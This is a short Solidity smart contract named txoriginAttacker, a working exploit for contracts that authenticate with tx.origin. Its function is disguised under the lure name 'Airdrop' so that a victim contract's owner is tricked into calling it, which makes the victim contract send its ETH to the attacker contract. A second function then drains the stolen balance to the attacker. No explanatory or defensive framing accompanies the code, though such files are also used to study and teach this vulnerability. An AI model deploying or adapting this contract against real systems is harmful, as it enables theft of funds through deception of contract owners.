// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface IVictim {
    function withdrawETH() external;
}

contract txoriginAttacker {
    address private immutable owner;
    IVictim private immutable victimContract;

    constructor(address _victim) {
        owner = msg.sender;
        victimContract = IVictim(_victim);
    }

    function Airdrop() external {
       victimContract.withdrawETH();
    }

    function getETH() external {
        require(msg.sender == owner, "No deposit of ETH found");
        uint256 bal = address(this).balance;
        require(bal > 0, "No ETH to drain");
        payable(owner).transfer(bal);
    }

    receive() external payable {}
    fallback() external payable {}
}
